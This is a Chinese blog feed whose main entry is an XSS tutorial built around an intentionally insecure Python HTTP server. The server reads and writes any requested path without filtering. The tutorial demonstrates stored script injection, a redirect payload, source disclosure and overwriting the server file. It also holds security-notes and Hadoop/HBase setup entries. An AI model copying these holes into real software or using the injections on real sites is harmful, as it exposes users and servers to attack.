    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>安全工程师的核心竞争力不在于他能拥有多少个 0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度</p>
</blockquote>
<h1 id="安全世界观"><a href="#安全世界观" class="headerlink" title="安全世界观"></a>安全世界观</h1><p>**root(administrator)**：用户态的最高权限，系统最高权限</p>
<h1 id="客户端脚本安全"><a href="#客户端脚本安全" class="headerlink" title="客户端脚本安全"></a>客户端脚本安全</h1><h1 id="服务器端应用安全"><a href="#服务器端应用安全" class="headerlink" title="服务器端应用安全"></a>服务器端应用安全</h1><h1 id="互联网公司安全运营"><a href="#互联网公司安全运营" class="headerlink" title="互联网公司安全运营"></a>互联网公司安全运营</h1>]]></content>
      <tags>
        <tag>web security</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS攻击</title>
    <url>/2020/06/11/xss-attack/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="使用python内置的库开发一个基本的http服务器端"><a href="#使用python内置的库开发一个基本的http服务器端" class="headerlink" title="使用python内置的库开发一个基本的http服务器端"></a>使用python内置的库开发一个基本的http服务器端</h1><ul>
<li><a href="#%E8%AE%B2%E8%A7%A3%E4%BB%A3%E7%A0%81">测试代码</a></li>
<li>使用python原生的cgi和http.server两个库运行的一个简单的http服务器程序<ul>
<li>因为没有使用第三方库，所有不需要使用pip安装依赖</li>
<li>运行比较简单</li>
<li>公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按 CGI 编写的程序可以扩展服务器功能</li>
</ul>
</li>
</ul>
<a id="more"></a>

<h2 id="讲解代码"><a href="#讲解代码" class="headerlink" title="讲解代码"></a>讲解代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTTPRequestHandler</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">    field_name = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    form_html = \</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=&#x27;post&#x27; enctype=&#x27;multipart/form-data&#x27;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&#x27;text&#x27; name=&#x27;%s&#x27;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&#x27;submit&#x27;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % field_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file = <span class="built_in">open</span>(<span class="string">&quot;.&quot;</span>+self.path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            self.wfile.write(self.form_html.encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content = file.read()</span><br><span class="line">            self.wfile.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">        form_data = cgi.FieldStorage(</span><br><span class="line">            fp=self.rfile,</span><br><span class="line">            headers=self.headers,</span><br><span class="line">            environ=&#123;</span><br><span class="line">                <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: self.headers[<span class="string">&#x27;Content-Type&#x27;</span>],</span><br><span class="line">            &#125;)</span><br><span class="line">        fields = form_data.keys()</span><br><span class="line">        <span class="keyword">if</span> self.field_name <span class="keyword">in</span> fields:</span><br><span class="line">            input_data = form_data[self.field_name].value</span><br><span class="line">            file = <span class="built_in">open</span>(<span class="string">&quot;.&quot;</span>+self.path, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">            file.write(input_data.encode())</span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(<span class="string">b&quot;&lt;html&gt;&lt;body&gt;OK&lt;/body&gt;&lt;/html&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTTPServer</span>(<span class="params">HTTPServer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span></span><br><span class="line">        print(<span class="string">&quot;run app server by python!&quot;</span>)</span><br><span class="line">        HTTPServer.__init__(self,  (host, port), MyHTTPRequestHandler)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> == __name__:</span><br><span class="line">    server_ip = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    server_port = <span class="number">8080</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        server_port = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        server_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">        server_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    print(<span class="string">&quot;App server is running on http://%s:%s &quot;</span> % (server_ip, server_port))</span><br><span class="line"></span><br><span class="line">    server = MyHTTPServer(server_ip, server_port)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h3><ul>
<li>使用<code>python httpserver.py</code>或者<code>py httpserver.py</code><ul>
<li>使用vscode调试代码，在同目录下会自动生成一个<code>.vscode</code>的目录，目录下生成<code>launch.json</code>文件，配置如下<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Python: 当前文件&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;console&quot;</span>: <span class="string">&quot;integratedTerminal&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>在浏览器的访问网址为<code>127.0.0.1:8080/a.html</code><img src="a-html.png" width=50%></li>
</ul>
<h3 id="主要的父类与子类"><a href="#主要的父类与子类" class="headerlink" title="主要的父类与子类"></a>主要的父类与子类</h3><h4 id="http-methods"><a href="#http-methods" class="headerlink" title="http methods"></a>http methods</h4><ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">http请求下的多种methods</a><ul>
<li>通常使用得最多的，是 GET 和 POST</li>
<li>直接在浏览器中输入链接，浏览器拿到地址以后，默认是采用 GET 方式向服务器发送请求，GET 方式最常见。</li>
<li>表单使用的 post 方法提交数据 <code>&lt;form method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&gt;</code></li>
<li>通常来说，从服务器获取数据，使用 get 方法，向服务器提交数据，使用 post 方法</li>
<li>其他的方法，在现在的web应用程序中，用到的很少</li>
</ul>
</li>
</ul>
<h4 id="MyHTTPServer类"><a href="#MyHTTPServer类" class="headerlink" title="MyHTTPServer类"></a>MyHTTPServer类</h4><ul>
<li><p>MyHTTPServer类，是继承自原生的HTTPServer，重写 init 函数，增加了打印输出语言</p>
</li>
<li><p>然后直接调用父类 HTTPServer 的 init 函数传递了服务器运行需要的地址、端口等参数，我们的监听地址和端口是 0.0.0.0:8080</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTTPServer</span>(<span class="params">HTTPServer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port</span>):</span></span><br><span class="line">        print(<span class="string">&quot;run app server by python!&quot;</span>)</span><br><span class="line">        HTTPServer.__init__(self,  (host, port), MyHTTPRequestHandler)</span><br></pre></td></tr></table></figure>
<h4 id="MyHTTPRequestHandler"><a href="#MyHTTPRequestHandler" class="headerlink" title="MyHTTPRequestHandler"></a>MyHTTPRequestHandler</h4></li>
<li><p>MyHTTPRequestHandler 类，这个是 HTTPServer 的回调，用来处理到达的请求，也就是 0.0.0.0:8080 上有任何的 HTTP 请求到达时，都会调用 MyHTTPRequestHandler来处理</p>
<ul>
<li>MyHTTPRequestHandler 直接继承自 BaseHTTPRequestHandler</li>
<li>重写了父类的 do_GET和do_POST两个方法</li>
<li>这个HTTP请求的处理类是整个代码的主体，也是出问题的地方</li>
<li>在 python 的 BaseHTTPRequestHandler 类中 ，do_XXX函数，就是处理对应的客户端请求的函数。代码指定了 MyHTTPRequestHandler 来处理 http 请求，那么当用 GET 方法请求，就会调用 do_GET，POST 方法请求，就会调用 do_POST函数</li>
<li>浏览器所发送的数据包里包括请求类型， 在 http 的 headers里，会说明方法。</li>
<li>这是python最基本的http 服务器的方式</li>
</ul>
</li>
</ul>
<h3 id="其他处理"><a href="#其他处理" class="headerlink" title="其他处理"></a>其他处理</h3><ul>
<li>通常，一个静态的http服务器，这里的路径就是 http 服务器根目录下的文件，动态服务器可能是文件和参数，或者是对应其他服务器后台的处理过程<ul>
<li>self.path 是这个请求的路径</li>
<li>例如 <a href="http://127.0.0.1:8080/a.html">http://127.0.0.1:8080/a.html</a> 。其中 <a href="http://127.0.0.1:8080是协议服务器地址和端口。/a.html就是路径">http://127.0.0.1:8080是协议服务器地址和端口。/a.html就是路径</a></li>
<li>例如 <a href="http://127.0.0.1:8080/a.php?p1=x">http://127.0.0.1:8080/a.php?p1=x</a> 。指定由 a.php 来处理这个请求，参数是 p1=x 。问号后面是参数，可以有多个</li>
</ul>
</li>
<li>一般来说，如果读的文件不存在，应该返回404<ul>
<li>self.send_response(200) 按照协议应该是404</li>
<li>则这里的处理为 如果指定的文件不存在，还是返回200，表示请求路径是正确的，可以处理，然后返回一个默认的页面。这个页面是 form_html的变量，在FileNotFoundError异常处理过程中写回</li>
<li>self.wfile 和 self.rfile 对应 http 响应和请求的 body 部分</li>
</ul>
</li>
<li>GET处理完成以后，浏览器就拿到了 200 状态的  “Content-type” 为 “text/html” 的 form_html</li>
<li>在浏览器刷新是重复上一次的POST请求，所以会提示是否要重新提交表单</li>
</ul>
<h3 id="调试运行"><a href="#调试运行" class="headerlink" title="调试运行"></a>调试运行</h3><ul>
<li>在 def do_GET 下断点，刷新浏览器，代码就会断点命中中断。</li>
<li>结合浏览器，抓包看看 http 请求和响应的数据格式 （用抓包器或者浏览器的调试模式观察）</li>
</ul>
<h4 id="浏览器调试模式"><a href="#浏览器调试模式" class="headerlink" title="浏览器调试模式"></a>浏览器调试模式</h4><ul>
<li><p>打开浏览器的调试模式(chrome &gt; 菜单 &gt; 更多工具 &gt; 开发者工具)</p>
</li>
<li><p>在sources这个标签下看到服务器向浏览器返回的数据，即 form_html 变量</p>
<ul>
<li><p>这一段 html 浏览器渲染出来，就是那个带一个编辑框的表单- 表单指定了使用post方式向服务器提交数据</p>
<img src="sourcetab.png"></li>
</ul>
</li>
<li><p>在network tab里可以看到完整的请求响应过程</p>
<img src="networktab.png">

<ul>
<li>完整的网络数据，其中 header 里就说了 GET 或者 POST 、返回的状态码200等等<img src="headers.png"></li>
</ul>
</li>
<li><p>在表单中填入数据，点提交按钮，然后服务器的 do_POST 函数被调用。通过 cgi.FieldStorage解析了客户端提交的请求，原始的请求的头部在self.headers。body部分在self.rfile。解析完成以后放到 form_data变量里，其中 form_data[‘field_name’].value 是在编辑框中填入的数据</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">form_data = cgi.FieldStorage(</span><br><span class="line">          fp=self.rfile,</span><br><span class="line">          headers=self.headers,</span><br><span class="line">          environ=&#123;</span><br><span class="line">              <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: self.headers[<span class="string">&#x27;Content-Type&#x27;</span>],</span><br><span class="line">          &#125;)</span><br></pre></td></tr></table></figure>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3></li>
<li><p>通常，一个服务器会根据业务逻辑处理用户提交的数据，比如用户发表的商品评论，比如在线教学系统中填入的作业一般会写入数据库。但是这些数据，在某些情况下又会被显示出来，比如其他用户查看别人的商品评论的时候，比如老师查看学生的作业时。</p>
</li>
<li><p>为了模拟这个过程，简化了一下，没有用户系统，也没有数据库，直接写入了 path 对应的文件。</p>
</li>
<li><p>处理用户提交，写入文件</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fields = form_data.keys()</span><br><span class="line"><span class="keyword">if</span> self.field_name <span class="keyword">in</span> fields:</span><br><span class="line">    input_data = form_data[self.field_name].value</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;.&quot;</span>+self.path, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file.write(input_data.encode())</span><br></pre></td></tr></table></figure>
<ul>
<li>fields = form_data.keys()是获取表单中的键值对，因此使用.value得到输入的值：这里获得是对应的是form中input的name <code>&lt;input type=&#39;text&#39; name=&#39;%s&#39;&gt;</code></li>
<li>表单以变量名变量值的方式组织，input的name相当于变量名，填入的数据就是变量值</li>
<li>python的cgi.FieldStorage将form组织为python的dict数据类型，所以可以通过  form_data[‘field_name’].value 获得所填入的数据</li>
</ul>
</li>
<li><p>如果写入成功，就返回一个 200 状态的 OK </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">self.send_response(<span class="number">200</span>)</span><br><span class="line">self.send_header(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;&lt;html&gt;&lt;body&gt;OK&lt;/body&gt;&lt;/html&gt;&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><ul>
<li><p>如果向网页中填入了 123 ，那么123被写入了a.html文件。执行完成后，同目录下会多一个a.html，内容为123。然后下次再访问 <a href="http://127.0.0.1:8080/a.html">http://127.0.0.1:8080/a.html</a> 时，在浏览器地址栏里回车。由于这个时候a.html已经存在了，所以是运行的部分是</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    content = file.read()</span><br><span class="line">    self.wfile.write(content)</span><br></pre></td></tr></table></figure>
<ul>
<li>会直接把文件内容会写给浏览器</li>
<li>这里是在简化模拟用户提交数据 &gt; 存入数据 &gt; 其他用户获取这个数据的过程</li>
</ul>
<img src="httpserver1.gif"></li>
<li><p>XSS漏洞</p>
<ul>
<li><p>再访问一个不存在的页面，比如b.html，又会出现那个默认的form。这时输入<code>&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code>，然后在访问b.html的时候，整个页面被载入 script 在浏览器上执行，也就是<strong>用户提交的数据被执行了</strong></p>
<img src="httpserver-xss.gif"></li>
<li><p>重新开一个页面，在c.html中填入<code>&lt;html&gt;&lt;body&gt;&lt;script&gt;window.location.href=&#39;http://by.cuc.edu.cn&#39;&lt;/script&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code>。下次再访问c.html的时候。页面跳转了。<code>window.location.href=&#39;http://by.cuc.edu.cn&#39;</code> 这段脚本的功能是实现了跳转</p>
</li>
</ul>
</li>
<li><p>理论上，任何的js都是可以被执行的。js可以实现非常丰富的功能。比如可以骗取用户扫码、支付，实际到黑客的账户。如果是没有基本防御措施的网站，这段会被放进服务器数据库里，然后别人提交了数据就自动跳转到这个网站。比如有一个商品A，用户在评论里输入了一段js代码。如果服务器不做处理直接保存。后面的用户访问商品A、看评论，前一个用户输入的代码就会在其他用户的页面上执行。</p>
</li>
</ul>
<h3 id="Furthermore"><a href="#Furthermore" class="headerlink" title="Furthermore"></a>Furthermore</h3><ul>
<li><p>如果大家在浏览器中访问 <a href="http://127.0.0.1:8080/httpserver.py">http://127.0.0.1:8080/httpserver.py</a> ，则在sources中显示全部完整的源代码。由于服务器没有做任何过滤，只要是存在的文件，就发送给客户端</p>
<ul>
<li>现在黑客可以知道我整个后台的逻辑了。</li>
<li>如果还有一些配置文件，比如数据库地址和访问口令等。那就更严重了</li>
<li>更严重的是，黑客甚至可以注入后端代码。由于我们是回写到文件，可以构造一个http post请求，把httpserver.py文件改写了。但是构造这个请求用浏览器就不行了，需要采用curl等更基础的工具裸写post请求发送给服务器的</li>
</ul>
</li>
<li><p>在调试工具的 elements tab，由于后台只处理名为a的表单项写入文件，所以我们需要把input的把 name=”%s” 改为 name=”a” 再提交。改为以后，同时在提交框中输入‘hahaha’提交。此时httpserver.py，它变为’hahaha’，只是注入一个hahaha 服务器就挂了，再也跑不起来了。</p>
<img src="httpserver-xss3.gif"></li>
<li><p>所以，这是一个及其简单，但是漏洞百出的web服务器。这就是不做任何过滤，直接写入数据的危害。</p>
</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">http methods</a></li>
</ul>
]]></content>
      <tags>
        <tag>xss</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL数据库系统Hadoop-Hbase安装配置(伪分布模式)与简单使用</title>
    <url>/2020/05/15/Hadoop-Hbase/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><style>
  /* 设置整个页面的字体 */
  html, body, .markdown-body {
    font-family: Georgia, sans, serif;
    font-size: 15px;
  }

  /* 只设置 markdown 字体 */
  .markdown-body {
    font-family: Georgia, sans, serif;
    font-size: 15px;
  }
</style>

<ul>
<li>Hbase是一种NoSQL数据库，这意味着它不像传统的RDBMS(关系数据库管理系统 Relational Database Management System)数据库那样支持SQL作为查询语言</li>
<li>Hbase是一种分布式存储的数据库，技术上来讲，它更像是分布式存储而不是分布式数据库</li>
<li>数据库量要足够多，如果有十亿及百亿行数据，那么Hbase是一个很好的选项，如果只有几百万行甚至不到的数据量，RDBMS是一个很好的选择。因为数据量小的话，真正能工作的机器量少，剩余的机器都处于空闲的状态</li>
<li>保证硬件资源足够，每个HDFS集群在少于5个节点的时候，都不能表现的很好。因为HDFS默认的复制数量是3，再加上一个NameNode</li>
</ul>
<a id="more"></a>

<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li>VMware Workstation Pro 12</li>
<li>系统为Ubuntu 16.04 Server的Linux虚拟机</li>
<li><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">jdk-8u201-linux-x64.tar.gz</a>，<a href="https://www.oracle.com/webfolder/s/digest/8u201checksum.html">校验和</a></li>
<li><a href="http://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-3.1.2/hadoop-3.1.2.tar.gz">hadoop-3.1.2.tar.gz</a>，<a href="https://archive.apache.org/dist/hadoop/common/hadoop-3.1.2/hadoop-3.1.2.tar.gz.mds">校验和</a></li>
<li>hbase-1.2.11-bin.tar.gz，<a href="https://archive.apache.org/dist/hbase/hbase-1.2.11/hbase-1.2.11-bin.tar.gz.sha512">校验和</a></li>
<li><a href="https://hadoop.apache.org/docs/r3.2.0/hadoop-project-dist/hadoop-common/SingleCluster.html">官方教程1</a>、<a href="https://hbase.apache.org/book.html">官方教程2</a></li>
</ul>
<h2 id="HBase结构"><a href="#HBase结构" class="headerlink" title="HBase结构"></a>HBase结构</h2><img src="hbase-construction.webp">

<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><h4 id="创建实验用户hadoop"><a href="#创建实验用户hadoop" class="headerlink" title="创建实验用户hadoop"></a>创建实验用户hadoop</h4><ul>
<li>[再已配置mysql cluster的基础上] 可以采用已有的mysql用户，给mysql用户做相应管理员权限赋权，后续需要用到用户名hadoop的时候，使用mysql</li>
<li>此处选择新创建hadoop用户<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo useradd -m hadoop -s &#x2F;bin&#x2F;bash  #创建hadoop用户，并使用&#x2F;bin&#x2F;bash作为shell</span><br><span class="line">$ sudo passwd hadoop  #为hadoop用户设置密码，之后需要连续输入两次密码</span><br><span class="line">$ sudo adduser hadoop sudo #为hadoop用户增加管理员权限</span><br><span class="line">$ su - hadoop            #切换当前用户为用户hadoop</span><br><span class="line">$ sudo apt-get update    #更新hadoop用户的apt,方便后面的安装</span><br></pre></td></tr></table></figure>
<img src="adduserhadoop.png"></li>
</ul>
<h4 id="SSH配置免密登录"><a href="#SSH配置免密登录" class="headerlink" title="SSH配置免密登录"></a>SSH配置免密登录</h4><ul>
<li><p>安装SSH，设置SSH无密码登陆</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install openssh-server   #安装SSH server</span><br><span class="line">$ ssh localhost         #登陆SSH，第一次登陆输入yes</span><br><span class="line">$ exit                  #退出登录的ssh localhost</span><br></pre></td></tr></table></figure>
  <img src="ssh-install.png" width=70%></li>
<li><p>生成密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ~&#x2F;.ssh&#x2F;                            #如果没法进入该目录，执行一次ssh localhost</span><br><span class="line">$ ssh-keygen -t rsa　　</span><br><span class="line"># 需要连续敲击三次回车</span><br><span class="line"># 第一次回车是让KEY存于默认位置，以方便后续的命令输入</span><br><span class="line"># 第二次和第三次是确定passphrase，相关性不大</span><br></pre></td></tr></table></figure>
<img src="ssh-keygen.png" width=70%></li>
<li><p>加入授权，免密登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat .&#x2F;id_rsa.pub &gt;&gt; .&#x2F;authorized_keys  #加入授权</span><br><span class="line">$ ssh localhost  #此时已不需密码即可登录localhost</span><br></pre></td></tr></table></figure>
<img src="ssh-authorizedkeys.png" width=70%></li>
</ul>
<h3 id="安装jdk1-8"><a href="#安装jdk1-8" class="headerlink" title="安装jdk1.8"></a>安装jdk1.8</h3><ul>
<li><p>在<a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">oracle官网</a>下载jdk1.8，根据个人电脑系统选择对应版本，如<code>jdk-8u201-linux-x64.tar.gz</code></p>
</li>
<li><p>安装过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir &#x2F;usr&#x2F;lib&#x2F;jvm  #创建jvm文件夹</span><br><span class="line">$ sudo tar zxvf  jdk-8u201-linux-x64.tar.gz  -C &#x2F;usr&#x2F;lib&#x2F;jvm  #&#x2F; 解压到&#x2F;usr&#x2F;lib&#x2F;jvm目录下</span><br><span class="line">$ cd &#x2F;usr&#x2F;lib&#x2F;jvm  #进入该目录</span><br><span class="line">$ mv  jdk1.8.0_201 java  #重命名为java</span><br><span class="line">$ vi ~&#x2F;.bashrc  #给JDK配置环境变量</span><br></pre></td></tr></table></figure></li>
<li><p>编辑环境变量<code>vi ~/.bashrc</code>，在<code>.bashrc</code>文件添加如下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib:$CLASSPATH</span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure>

  <img src="javaenrpath.png">

<ul>
<li>JAVA_HOME=/usr/lib/jvm/java</li>
</ul>
</li>
<li><p>使得环境变量生效，并查看是否安装成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ source ~&#x2F;.bashrc  #使新配置的环境变量生效</span><br><span class="line">$ java -version  #检测是否安装成功，查看java版本</span><br></pre></td></tr></table></figure>
  <img src="javainstallsuccess.png"></li>
</ul>
<h3 id="安装hadoop-3-1-2"><a href="#安装hadoop-3-1-2" class="headerlink" title="安装hadoop-3.1.2"></a>安装hadoop-3.1.2</h3><ul>
<li>下载<a href="http://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-3.1.2/hadoop-3.1.2.tar.gz">hadoop-3.1.2.tar.gz</a>并安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo tar -zxvf  hadoop-3.1.2.tar.gz  -C  &#x2F;usr&#x2F;local  #解压到&#x2F;usr&#x2F;local目录下</span><br><span class="line">$ cd &#x2F;usr&#x2F;local</span><br><span class="line">$ sudo mv  hadoop-3.1.2 hadoop  #重命名为hadoop</span><br><span class="line">$ sudo chown -R hadoop .&#x2F;hadoop  #修改文件权限，根据实际情况确定用户名</span><br></pre></td></tr></table></figure></li>
<li>配置环境变量，将下面代码添加到<code>.bashrc</code>文件:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export HADOOP_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;hadoop</span><br><span class="line">export HADOOP_COMMON_LIB_NATIVE_DIR&#x3D;$HADOOP_HOME&#x2F;lib&#x2F;native</span><br><span class="line">export PATH&#x3D;$PATH:$HADOOP_HOME&#x2F;bin:$HADOOP_HOME&#x2F;sbin</span><br></pre></td></tr></table></figure></li>
<li>执行<code>source ~/.bashrc</code>使设置生效，并查看<code>hadoop</code>是否安装成功  <img src="hadoopinstallsuccess.png"></li>
</ul>
<h3 id="伪分布配置"><a href="#伪分布配置" class="headerlink" title="伪分布配置"></a>伪分布配置</h3><ul>
<li><code>Hadoop</code>可以在单节点上以伪分布式的方式运行，<code>Hadoop</code>进程以分离的<code>Java</code>进程来运行，节点既作为<code>NameNode</code>也作为 <code>DataNode</code>，同时，读取的是<code>HDFS</code>中的文件</li>
<li><code>Hadoop</code>的配置文件位于<code>/usr/local/hadoop/etc/hadoop/</code>中，伪分布式需要修改2个配置文件<code>core-site.xml</code>和<code>hdfs-site.xml</code> </li>
<li><code>Hadoop</code>的配置文件是<code>xml</code>格式，每个配置以声明<code>property</code> 的<code>name</code>和<code>value</code>的方式来实现</li>
</ul>
<h4 id="修改hadoop-env-sh文件"><a href="#修改hadoop-env-sh文件" class="headerlink" title="修改hadoop-env.sh文件"></a>修改hadoop-env.sh文件</h4><ul>
<li><p>首先将jdk1.8的路径添(<code>export JAVA_HOME=/usr/lib/jvm/java</code>)加到<code>hadoop-env.sh</code>文件，路径为<code>cd /usr/local/hadoop/etc/hadoop/</code></p>
  <img src="hadoopenv.png" width=70%></li>
</ul>
